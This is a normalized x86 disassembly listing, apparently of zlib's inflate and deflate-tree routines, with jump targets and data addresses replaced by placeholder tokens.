shr [ esp + 0x10 ] cl
mov ecx [ esp + 0x8 ]
sub ebp edx
xor edx edx
mov dl [ ecx ]
mov [ esp + 0xc ] edx
cmp [ esp + 0xc ] 0x0
jne r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
and edx [ esp + 0x10 ]
add [ ecx + 0x4 ] edx
mov ecx [ esp + 0x4 ]
shr [ esp + 0x10 ] cl
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x20 ]
sub ebp [ esp + 0x4 ]
movzx edx [ edx + 0x11 ]
mov [ ecx + 0xc ] edx
mov edx [ esp + 0x20 ]
mov ecx [ edx + 0x18 ]
mov edx [ esp + 0x20 ]
mov [ edx + 0x8 ] ecx
mov ecx [ esp + 0x20 ]
mov [ ecx ] 0x3
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ ecx + 0x8 ]
mov ecx [ esp + 0x4 ]
mov ecx [ ecx * 4 + rw-data ]
and ecx [ esp + 0x10 ]
shl ecx 0x3
add edx ecx
mov [ esp + 0x8 ] edx
mov edx [ esp + 0x8 ]
mov dl [ edx + 0x1 ]
mov ecx edx
and edx 0xff
shr [ esp + 0x10 ] cl
mov ecx [ esp + 0x8 ]
sub ebp edx
xor edx edx
mov dl [ ecx ]
mov [ esp + 0xc ] edx
test [ esp + 0xc ] 0x10
je r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
and edx [ esp + 0x10 ]
add [ ecx + 0xc ] edx
mov ecx [ esp + 0x4 ]
shr [ esp + 0x10 ] cl
mov edx [ esp + 0x20 ]
sub ebp [ esp + 0x4 ]
mov [ edx ] 0x5
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov edx [ ebx + 0x28 ]
cmp edx [ esp + 0x1c ]
ja r-xdata
xor edx edx
mov [ esp ] edx
mov ecx [ esp + 0x20 ]
mov dl [ ecx + 0x8 ]
mov [ eax ] dl
inc eax
dec [ esp + 0x18 ]
mov ecx [ esp + 0x20 ]
xor edx edx
mov [ ecx ] edx
jmp r-xdata
cmp eax [ ebx + 0x2c ]
jne r-xdata
mov [ ebx + 0x34 ] eax
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_3ae91a8
mov [ esp ] eax
mov eax [ ebx + 0x34 ]
cmp eax [ ebx + 0x30 ]
jae r-xdata
sub ebp 0x8
inc [ esp + 0x14 ]
dec edi
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x1c ] ebp
mov edx [ esp + 0x14 ]
mov ecx edi
mov [ esi + 0x4 ] edx
sub ecx [ esi ]
add [ esi + 0x8 ] ecx
mov [ esi ] edi
mov [ ebx + 0x34 ] eax
mov eax [ esp + 0x20 ]
mov eax [ eax + 0x18 ]
push eax
push ebx
push esi
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x2c ]
mov ecx [ edx + 0x14 ]
xor edx edx
mov dl [ eax + 0x11 ]
mov eax [ esp + 0x2c ]
movzx eax [ eax + 0x10 ]
call sub_3ae92b8
mov [ esp ] eax
mov edi [ esi ]
mov eax [ esi + 0x4 ]
mov [ esp + 0x14 ] eax
mov edx [ ebx + 0x20 ]
mov [ esp + 0x10 ] edx
mov ebp [ ebx + 0x1c ]
mov eax [ ebx + 0x34 ]
cmp eax [ ebx + 0x30 ]
jae r-xdata
test [ esp + 0xc ] 0x10
je r-xdata
mov ecx [ esp + 0x8 ]
mov edx [ ecx + 0x4 ]
mov ecx [ esp + 0x20 ]
mov [ ecx + 0x8 ] edx
mov edx [ esp + 0x20 ]
mov [ edx ] 0x6
jmp r-xdata
mov edx [ esp + 0x10 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x1c ] ebp
mov ecx [ esp + 0x14 ]
mov [ esi + 0x4 ] ecx
mov edx edi
sub edx [ esi ]
add [ esi + 0x8 ] edx
mov [ esi ] edi
mov [ ebx + 0x34 ] eax
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_3ae91a8
jmp r-xdata
xor ecx ecx
mov [ esp ] ecx
jmp r-xdata
mov edx [ esp + 0x10 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x1c ] ebp
mov ecx [ esp + 0x14 ]
mov [ esi + 0x4 ] ecx
mov edx edi
sub edx [ esi ]
add [ esi + 0x8 ] edx
mov [ esi ] edi
mov [ ebx + 0x34 ] eax
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_3ae91a8
jmp r-xdata
xor ecx ecx
mov [ esp ] ecx
jmp r-xdata
test [ esp + 0xc ] 0x40
jne r-xdata
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0xc ]
and ecx 0xf
mov [ edx + 0x8 ] ecx
mov ecx [ esp + 0x8 ]
mov edx [ ecx + 0x4 ]
mov ecx [ esp + 0x20 ]
mov [ ecx + 0xc ] edx
mov edx [ esp + 0x20 ]
mov [ edx ] 0x4
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x1c ] ebp
mov edx [ esp + 0x14 ]
mov ecx edi
mov [ esi + 0x4 ] edx
mov edx esi
sub ecx [ esi ]
add [ esi + 0x8 ] ecx
mov [ esi ] edi
mov [ ebx + 0x34 ] eax
mov eax ebx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
xor edx edx
mov [ esp ] edx
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x1c ] ebp
mov edx [ esp + 0x14 ]
mov ecx edi
mov [ esi + 0x4 ] edx
mov edx esi
sub ecx [ esi ]
add [ esi + 0x8 ] ecx
mov [ esi ] edi
mov [ ebx + 0x34 ] eax
mov eax ebx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
xor edx edx
mov [ esp ] edx
jmp r-xdata
mov ecx [ ebx + 0x2c ]
sub ecx edx
add [ esp + 0x1c ] ecx
jmp r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ ecx ]
cmp edx 0x9
ja r-xdata
cmp [ esp + 0x18 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x30 ]
cmp ecx [ ebx + 0x28 ]
je r-xdata
mov edx [ ebx + 0x2c ]
sub edx eax
mov edx [ ebx + 0x30 ]
sub edx eax
dec edx
jmp r-xdata
mov edx [ ebx + 0x2c ]
sub edx eax
mov edx [ ebx + 0x30 ]
sub edx eax
dec edx
jmp r-xdata
test [ esp + 0xc ] 0x40
jne r-xdata
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0xc ]
and ecx 0xf
mov [ edx + 0x8 ] ecx
mov ecx [ esp + 0x8 ]
mov edx [ ecx + 0x4 ]
mov ecx [ esp + 0x20 ]
mov [ ecx + 0x4 ] edx
mov edx [ esp + 0x20 ]
mov [ edx ] 0x2
jmp r-xdata
dec [ esp + 0x14 ]
mov ecx ebp
mov dl [ edi ]
inc edi
and edx 0xff
add ebp 0x8
shl edx cl
or [ esp + 0x10 ] edx
cmp ebp [ esp + 0x4 ]
jb r-xdata
dec [ esp + 0x14 ]
mov ecx ebp
mov dl [ edi ]
inc edi
and edx 0xff
add ebp 0x8
shl edx cl
or [ esp + 0x10 ] edx
cmp ebp [ esp + 0x4 ]
jb r-xdata
mov edx [ esp + 0x20 ]
mov [ edx ] 0x9
mov [ esi + 0x18 ] rw-data
mov [ esp ] 0xfffffffd
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x1c ] ebp
mov edx [ esp + 0x14 ]
mov ecx edi
mov [ esi + 0x4 ] edx
mov edx esi
sub ecx [ esi ]
add [ esi + 0x8 ] ecx
mov [ esi ] edi
mov [ ebx + 0x34 ] eax
mov eax ebx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0xc ]
mov [ ecx + 0xc ] edx
mov ecx [ esp + 0x8 ]
mov edx [ ecx + 0x4 ]
mov ecx [ esp + 0x20 ]
shl edx 0x3
add edx [ esp + 0x8 ]
mov [ ecx + 0x8 ] edx
jmp r-xdata
dec [ esp + 0x14 ]
mov ecx ebp
mov dl [ edi ]
inc edi
and edx 0xff
add ebp 0x8
shl edx cl
or [ esp + 0x10 ] edx
cmp ebp [ esp + 0x4 ]
jb r-xdata
dec [ esp + 0x14 ]
mov ecx ebp
mov dl [ edi ]
inc edi
and edx 0xff
add ebp 0x8
shl edx cl
or [ esp + 0x10 ] edx
cmp ebp [ esp + 0x4 ]
jb r-xdata
mov edx [ esp + 0x20 ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov [ ebx + 0x34 ] eax
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_3ae91a8
mov [ esp ] eax
mov eax [ ebx + 0x34 ]
cmp eax [ ebx + 0x30 ]
jae r-xdata
mov eax [ ebx + 0x28 ]
cmp eax [ ebx + 0x30 ]
jae r-xdata
mov ecx [ esp + 0x20 ]
mov [ ecx ] 0x8
mov edx [ esp + 0x10 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x1c ] ebp
mov ecx [ esp + 0x14 ]
mov [ esi + 0x4 ] ecx
mov edx edi
sub edx [ esi ]
add [ esi + 0x8 ] edx
mov [ esi ] edi
mov [ ebx + 0x34 ] eax
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_3ae91a8
jmp r-xdata
mov ecx [ ebx + 0x30 ]
cmp ecx [ ebx + 0x34 ]
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov [ esp + 0x18 ] edx
cmp [ esp ] 0x0
je r-xdata
test [ esp + 0xc ] 0x20
je r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0xc ]
mov [ ecx + 0xc ] edx
mov ecx [ esp + 0x8 ]
mov edx [ ecx + 0x4 ]
mov ecx [ esp + 0x20 ]
shl edx 0x3
add edx [ esp + 0x8 ]
mov [ ecx + 0x8 ] edx
jmp r-xdata
cmp [ esp + 0x18 ] 0x0
jne r-xdata
mov ecx [ esp + 0x20 ]
xor edx edx
mov [ ecx ] edx
jmp r-xdata
mov edx [ ebx + 0x2c ]
sub edx eax
mov edx [ ebx + 0x30 ]
sub edx eax
dec edx
jmp r-xdata
mov edx [ ebx + 0x2c ]
sub edx eax
mov edx [ ebx + 0x30 ]
sub edx eax
dec edx
jmp r-xdata
mov ecx 0x9
mov ecx 0x7
jmp r-xdata
mov ecx [ esp + 0x20 ]
mov [ ecx ] 0x9
mov [ esi + 0x18 ] rw-data
mov [ esp ] 0xfffffffd
mov edx [ esp + 0x10 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x1c ] ebp
mov ecx [ esp + 0x14 ]
mov [ esi + 0x4 ] ecx
mov edx edi
sub edx [ esi ]
add [ esi + 0x8 ] edx
mov [ esi ] edi
mov [ ebx + 0x34 ] eax
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_3ae91a8
jmp r-xdata
mov edx [ esp + 0x20 ]
mov [ edx ] 0x7
jmp r-xdata
xor edx edx
mov [ esp ] edx
mov ecx [ esp + 0x1c ]
mov dl [ ecx ]
mov [ eax ] dl
inc [ esp + 0x1c ]
inc eax
dec [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
cmp ecx [ ebx + 0x2c ]
jne r-xdata
cmp eax [ ebx + 0x2c ]
jne r-xdata
cmp [ esp + 0x18 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x30 ]
cmp ecx [ ebx + 0x28 ]
je r-xdata
mov [ esp + 0x18 ] edx
cmp eax [ ebx + 0x2c ]
jne r-xdata
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x20 ]
mov [ edx ] ecx
jmp r-xdata
mov ecx [ esp + 0x20 ]
dec [ ecx + 0x4 ]
mov edx [ ebx + 0x28 ]
mov [ esp + 0x1c ] edx
cmp [ esp + 0x18 ] 0x0
jne r-xdata
mov edx [ ebx + 0x30 ]
cmp edx [ ebx + 0x28 ]
je r-xdata
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x1c ] ebp
mov edx [ esp + 0x14 ]
mov ecx edi
mov [ esi + 0x4 ] edx
mov edx esi
sub ecx [ esi ]
add [ esi + 0x8 ] ecx
mov [ esi ] edi
mov [ ebx + 0x34 ] eax
mov eax ebx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
mov eax [ ebx + 0x28 ]
cmp eax [ ebx + 0x30 ]
jae r-xdata
mov [ ebx + 0x34 ] eax
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_3ae91a8
mov [ esp ] eax
mov eax [ ebx + 0x34 ]
cmp eax [ ebx + 0x30 ]
jae r-xdata
mov eax [ ebx + 0x28 ]
cmp eax [ ebx + 0x30 ]
jae r-xdata
mov edx [ ebx + 0x2c ]
sub edx eax
mov edx [ ebx + 0x30 ]
sub edx eax
dec edx
jmp r-xdata
mov edx [ ebx + 0x2c ]
sub edx eax
mov edx [ ebx + 0x30 ]
sub edx eax
dec edx
jmp r-xdata
mov ecx [ ebx + 0x2c ]
sub ecx eax
mov ecx [ ebx + 0x30 ]
sub ecx eax
dec ecx
jmp r-xdata
mov [ esp + 0x18 ] edx
cmp [ esp + 0x18 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x30 ]
cmp ecx [ ebx + 0x28 ]
je r-xdata
mov [ esp + 0x18 ] edx
cmp eax [ ebx + 0x2c ]
jne r-xdata
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x1c ] ebp
mov edx [ esp + 0x14 ]
mov ecx edi
mov [ esi + 0x4 ] edx
mov edx esi
sub ecx [ esi ]
add [ esi + 0x8 ] ecx
mov [ esi ] edi
mov [ ebx + 0x34 ] eax
mov eax ebx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
mov eax [ ebx + 0x28 ]
cmp eax [ ebx + 0x30 ]
jae r-xdata
mov edx [ ebx + 0x2c ]
sub edx eax
mov edx [ ebx + 0x30 ]
sub edx eax
dec edx
jmp r-xdata
mov [ esp + 0x18 ] edx
sub_3ae91a8
push ebx
push esi
push edi
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
mov eax [ esp ]
mov edx [ eax + 0xc ]
mov [ esp + 0x8 ] edx
mov edi [ esi + 0x30 ]
cmp edi [ esi + 0x34 ]
ja r-xdata
mov ebx [ esi + 0x2c ]
mov ebx [ esi + 0x34 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov ebx eax
sub ebx edi
mov eax [ esp ]
mov eax [ eax + 0x10 ]
cmp ebx eax
jbe r-xdata
mov edx [ esp ]
sub [ edx + 0x10 ] ebx
mov ecx [ esp ]
add [ ecx + 0x14 ] ebx
cmp [ esi + 0x38 ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0xfffffffb
jne r-xdata
push ebx
push edi
mov ecx [ esp + 0x10 ]
push ecx
call sub_3ae5438
add esp 0xc
mov eax ebx
add [ esp + 0x8 ] eax
add edi eax
mov eax [ esi + 0x2c ]
cmp edi eax
jne r-xdata
mov ecx ebx
mov edx edi
mov eax [ esi + 0x3c ]
call [ esi + 0x38 ]
mov [ esi + 0x3c ] eax
mov edx [ esp ]
mov [ edx + 0x30 ] eax
xor eax eax
mov [ esp + 0x4 ] eax
mov edx [ esp ]
mov ecx [ esp + 0x8 ]
mov [ edx + 0xc ] ecx
mov [ esi + 0x30 ] edi
mov eax [ esp + 0x4 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x28 ]
cmp eax [ esi + 0x34 ]
mov edi edx
jne r-xdata
mov eax [ esp ]
mov ebx [ esi + 0x34 ]
sub ebx edi
mov eax [ eax + 0x10 ]
cmp ebx eax
jbe r-xdata
mov [ esi + 0x34 ] edx
test ebx ebx
je r-xdata
mov ebx eax
mov edx [ esp ]
sub [ edx + 0x10 ] ebx
mov ecx [ esp ]
add [ ecx + 0x14 ] ebx
cmp [ esi + 0x38 ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0xfffffffb
jne r-xdata
push ebx
push edi
mov ecx [ esp + 0x10 ]
push ecx
call sub_3ae5438
add esp 0xc
mov eax ebx
add [ esp + 0x8 ] eax
add edi eax
mov ecx ebx
mov edx edi
mov eax [ esi + 0x3c ]
call [ esi + 0x38 ]
mov [ esi + 0x3c ] eax
mov edx [ esp ]
mov [ edx + 0x30 ] eax
xor eax eax
mov [ esp + 0x4 ] eax
sub_3ae92b8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov esi [ edx ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0xc ]
mov ebx [ ecx + 0x1c ]
mov ecx [ ebp + 0xc ]
mov edx [ edx + 0x20 ]
mov ecx [ ecx + 0x34 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x30 ]
cmp ecx [ ebp - 0x18 ]
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x2c ]
sub ecx [ ebp - 0x18 ]
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x30 ]
sub ecx [ ebp - 0x18 ]
dec ecx
jmp r-xdata
mov ecx [ ebp - 0x20 ]
and ecx edx
shl ecx 0x3
add ecx [ ebp - 0x8 ]
mov [ ebp - 0xc ] ecx
xor eax eax
mov al [ ecx ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
dec [ ebp - 0x14 ]
mov ecx ebx
mov al [ esi ]
inc esi
and eax 0xff
add ebx 0x8
shl eax cl
or edx eax
cmp ebx 0x14
jb r-xdata
mov [ ebp - 0x1c ] ecx
mov eax [ eax * 4 + rw-data ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp - 0x24 ] ecx
mov eax [ ebp - 0xc ]
mov al [ eax + 0x1 ]
mov ecx eax
and eax 0xff
shr edx cl
sub ebx eax
test [ ebp - 0x10 ] 0x10
je r-xdata
mov ecx [ ebp - 0xc ]
mov al [ ecx + 0x1 ]
mov ecx eax
and eax 0xff
shr edx cl
mov ecx [ ebp - 0xc ]
sub ebx eax
mov al [ ecx + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx ] al
inc [ ebp - 0x18 ]
dec [ ebp - 0x1c ]
jmp r-xdata
test [ ebp - 0x10 ] 0x40
jne r-xdata
and [ ebp - 0x10 ] 0xf
mov ecx [ ebp - 0xc ]
sub ebx [ ebp - 0x10 ]
mov eax [ ecx + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx * 4 + rw-data ]
and ecx edx
add eax ecx
mov ecx [ ebp - 0x10 ]
shr edx cl
cmp ebx 0xf
jae r-xdata
cmp [ ebp - 0x1c ] 0x102
jb r-xdata
test [ ebp - 0x10 ] 0x20
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ecx + 0x4 ]
shl eax 0x3
add [ ebp - 0xc ] eax
mov ecx [ ebp - 0x10 ]
mov eax [ ecx * 4 + rw-data ]
and eax edx
shl eax 0x3
add [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
xor eax eax
mov al [ ecx ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0x24 ]
and ecx edx
shl ecx 0x3
add ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
movzx ecx [ ecx ]
mov [ ebp - 0x10 ] ecx
dec [ ebp - 0x14 ]
mov cl [ esi ]
inc esi
mov edi ecx
mov ecx ebx
and edi 0xff
add ebx 0x8
shl edi cl
or edx edi
cmp ebx 0xf
jb r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
mov ecx ebx
shr ecx 0x3
sub eax [ ebp - 0x14 ]
cmp eax ecx
jbe r-xdata
cmp [ ebp - 0x14 ] 0xa
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] rw-data
mov eax [ ebp + 0x8 ]
mov ecx ebx
shr ecx 0x3
mov eax [ eax + 0x4 ]
sub eax [ ebp - 0x14 ]
cmp eax ecx
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov ecx ebx
shr ecx 0x3
mov eax [ eax + 0x4 ]
sub eax [ ebp - 0x14 ]
cmp eax ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov al [ ecx + 0x1 ]
mov ecx eax
and eax 0xff
shr edx cl
mov ecx [ ebp - 0xc ]
sub ebx eax
mov al [ ecx + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx ] al
inc [ ebp - 0x18 ]
dec [ ebp - 0x1c ]
jmp r-xdata
test [ ebp - 0x10 ] 0x40
jne r-xdata
and [ ebp - 0x10 ] 0xf
cmp ebx [ ebp - 0x10 ]
jae r-xdata
mov ecx eax
mov ecx ebx
shr ecx 0x3
jmp r-xdata
cmp ebx 0x14
jae r-xdata
mov ecx eax
mov ecx ebx
shr ecx 0x3
jmp r-xdata
mov ecx eax
mov ecx ebx
shr ecx 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx ebx
shr ecx 0x3
mov [ eax + 0x18 ] rw-data
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
sub eax [ ebp - 0x14 ]
cmp eax ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov ecx [ ecx + 0x4 ]
shl ecx 0x3
add [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx * 4 + rw-data ]
and ecx edx
shl ecx 0x3
add [ ebp - 0xc ] ecx
mov ecx [ ebp - 0xc ]
movzx ecx [ ecx ]
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx * 4 + rw-data ]
and ecx edx
add edi ecx
mov ecx [ ebp - 0x10 ]
shr edx cl
sub ebx [ ebp - 0x10 ]
sub [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x18 ]
sub ecx edi
mov [ ebp - 0x28 ] ecx
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x28 ]
cmp ecx [ ebp - 0x28 ]
jbe r-xdata
dec [ ebp - 0x14 ]
mov cl [ esi ]
inc esi
mov edi ecx
mov ecx ebx
and edi 0xff
add ebx 0x8
shl edi cl
or edx edi
cmp ebx [ ebp - 0x10 ]
jb r-xdata
mov eax ecx
add [ ebp - 0x14 ] eax
sub esi eax
shl eax 0x3
sub ebx eax
mov eax [ ebp + 0xc ]
mov [ eax + 0x20 ] edx
mov edx [ ebp + 0xc ]
mov [ edx + 0x1c ] ebx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
mov eax esi
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
sub eax [ ecx ]
add [ edx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ecx ] esi
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax ecx
add [ ebp - 0x14 ] eax
sub esi eax
shl eax 0x3
sub ebx eax
mov eax [ ebp + 0xc ]
mov [ eax + 0x20 ] edx
mov edx [ ebp + 0xc ]
mov [ edx + 0x1c ] ebx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
mov eax esi
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
sub eax [ ecx ]
add [ edx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ecx ] esi
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax 0xfffffffd
jmp r-xdata
mov eax ecx
add [ ebp - 0x14 ] eax
sub esi eax
shl eax 0x3
sub ebx eax
mov eax [ ebp + 0xc ]
mov [ eax + 0x20 ] edx
mov edx [ ebp + 0xc ]
mov [ edx + 0x1c ] ebx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
mov eax esi
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
sub eax [ ecx ]
add [ edx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ecx ] esi
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax 0x1
jmp r-xdata
mov ecx eax
mov ecx ebx
shr ecx 0x3
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov cl [ ecx + 0x1 ]
shr edx cl
mov ecx [ ebp - 0xc ]
movzx ecx [ ecx + 0x1 ]
sub ebx ecx
test [ ebp - 0x10 ] 0x10
je r-xdata
mov ecx [ ebp - 0x28 ]
mov edi [ ebp - 0x18 ]
dec eax
mov cl [ ecx ]
mov [ edi ] cl
inc [ ebp - 0x28 ]
inc [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
mov edi [ ebp - 0x18 ]
mov cl [ ecx ]
mov [ edi ] cl
inc [ ebp - 0x28 ]
inc [ ebp - 0x18 ]
dec eax
mov ecx [ ebp + 0xc ]
mov edi [ ebp + 0xc ]
mov ecx [ ecx + 0x2c ]
sub ecx [ edi + 0x28 ]
add [ ebp - 0x28 ] ecx
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x28 ]
cmp ecx [ ebp - 0x28 ]
ja r-xdata
mov eax ecx
add [ ebp - 0x14 ] eax
sub esi eax
shl eax 0x3
sub ebx eax
mov eax [ ebp + 0xc ]
mov [ eax + 0x20 ] edx
mov edx [ ebp + 0xc ]
mov [ edx + 0x1c ] ebx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
mov eax esi
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
sub eax [ ecx ]
add [ edx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ecx ] esi
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax 0xfffffffd
jmp r-xdata
mov ecx [ ebp - 0x28 ]
mov edi [ ebp - 0x18 ]
mov cl [ ecx ]
mov [ edi ] cl
inc [ ebp - 0x28 ]
inc [ ebp - 0x18 ]
dec eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x2c ]
sub ecx [ ebp - 0x28 ]
mov [ ebp - 0x10 ] ecx
cmp eax [ ebp - 0x10 ]
jbe r-xdata
mov ecx [ ebp - 0x28 ]
mov edi [ ebp - 0x18 ]
dec eax
mov cl [ ecx ]
mov [ edi ] cl
inc [ ebp - 0x28 ]
inc [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
mov edi [ ebp - 0x18 ]
mov cl [ ecx ]
mov [ edi ] cl
inc [ ebp - 0x28 ]
inc [ ebp - 0x18 ]
dec eax
sub eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x28 ]
mov edi [ ebp - 0x18 ]
mov cl [ ecx ]
mov [ edi ] cl
inc [ ebp - 0x28 ]
inc [ ebp - 0x18 ]
dec eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x28 ]
mov edi [ ebp - 0x18 ]
mov cl [ ecx ]
mov [ edi ] cl
inc [ ebp - 0x28 ]
inc [ ebp - 0x18 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x28 ]
mov [ ebp - 0x28 ] ecx
mov ecx [ ebp - 0x28 ]
mov edi [ ebp - 0x18 ]
mov cl [ ecx ]
mov [ edi ] cl
inc [ ebp - 0x28 ]
inc [ ebp - 0x18 ]
dec eax
jne r-xdata
jmp r-xdata
sub_3ae9784
push ebx
mov ebx eax
call sub_3ae9780
lea eax [ ebx + 0x8c ]
lea edx [ ebx + 0x980 ]
mov [ ebx + 0xb10 ] eax
lea ecx [ ebx + 0xa74 ]
mov [ ebx + 0xb18 ] rw-data
mov [ ebx + 0xb1c ] edx
xor eax eax
mov [ ebx + 0xb24 ] rw-data
mov [ ebx + 0xb28 ] ecx
mov [ ebx + 0xb30 ] rw-data
mov [ ebx + 0x16b0 ] 0x0
mov [ ebx + 0x16b4 ] eax
mov eax ebx
mov [ ebx + 0x16ac ] 0x8
call sub_3ae97f4
pop ebx
retn
sub_3ae97f4
xor edx edx
lea ecx [ eax + 0x8c ]
mov [ ecx ] 0x0
inc edx
add ecx 0x4
cmp edx 0x11e
jl r-xdata
xor edx edx
lea ecx [ eax + 0x980 ]
mov [ ecx ] 0x0
inc edx
add ecx 0x4
cmp edx 0x1e
jl r-xdata
xor edx edx
lea ecx [ eax + 0xa74 ]
mov [ ecx ] 0x0
inc edx
add ecx 0x4
cmp edx 0x13
jl r-xdata
mov [ eax + 0x48c ] 0x1
xor edx edx
xor ecx ecx
mov [ eax + 0x16a4 ] edx
mov [ eax + 0x16a0 ] edx
mov [ eax + 0x16a8 ] ecx
